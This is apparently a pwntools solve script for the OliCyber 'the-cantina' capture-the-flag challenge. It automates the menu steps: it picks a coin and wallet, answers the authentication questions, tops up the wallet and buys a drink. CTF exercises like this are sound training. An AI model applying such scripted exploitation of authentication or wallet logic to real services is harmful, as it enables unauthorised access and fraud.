from pwn import *

r = remote("the-cantina.challs.olicyber.it", 38083)

r.sendlineafter(b"> ", b"select_coin")
r.sendline(b"OLI")

r.sendlineafter(b"> ", b"select_wallet")
r.sendline(b"0xBABE")

r.sendlineafter(b"> ", b"authenticate")

r.recvline()
r.sendline(b"Han")

r.recvline()
r.sendline(b"Vader")

r.recvline()
r.sendline(b"Kashyyyk")

r.sendlineafter(b"> ", b"topup_wallet")

print(r.recvline())

r.sendlineafter(b"> ", b"list_drinks")

r.sendlineafter(b"> ", b"buy_drink")
r.sendline(b"Darksaber Distillate")


r.interactive()